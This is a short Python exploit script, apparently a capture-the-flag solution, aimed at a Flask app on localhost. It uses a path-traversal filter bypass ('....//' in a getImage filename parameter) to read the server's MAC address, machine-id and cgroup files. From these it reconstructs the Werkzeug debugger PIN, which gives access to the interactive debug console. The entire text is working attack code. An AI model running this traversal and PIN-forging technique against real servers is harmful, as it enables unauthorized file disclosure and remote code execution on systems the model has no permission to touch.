import hashlib
from itertools import chain
import requests

HOST = 'http://localhost:80'

def generate(id):
	linux = id
	linux = linux.replace('\n', '')
	CGROUP = requests.get(f'{HOST}/getImage?filename=....//....//....//....//....//....//....//proc/self/cgroup').text
	
	f = open('cgroup', 'w')
	f.write(CGROUP)
	f.close()
	
	with open("cgroup", "rb") as f:
		linux += str(f.readline().strip().rpartition(b"/")[2])
	
	linux = linux.replace("b'", "")
	linux = linux.replace("'", "")

	return linux

def getnode(macaddr):
	macaddr = macaddr.replace(':', '')
	macaddr = macaddr.replace('\n', '')
	macaddr = '0x' + macaddr
	return str(int(macaddr, 0))

MAC_ADDR = requests.get(f'{HOST}/getImage?filename=....//....//....//....//....//....//....//sys/class/net/eth0/address').text
MAC_ADDR = getnode(MAC_ADDR)

MACHINE_ID = requests.get(f'{HOST}/getImage?filename=....//....//....//....//....//....//....//etc/machine-id').text
MACHINE_ID = generate(MACHINE_ID)

probably_public_bits = [
	'robots3', # username
	'flask.app',# modname 고정
	'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
	'/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
 
private_bits = [
	MAC_ADDR, # /sys/class/net/ens4/address 
	MACHINE_ID
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode("utf-8")
	h.update(bit)
h.update(b"cookiesalt")
 
cookie_name = f"__wzd{h.hexdigest()[:20]}"
 
num = None
if num is None:
	h.update(b"pinsalt")
	num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num

print(rv)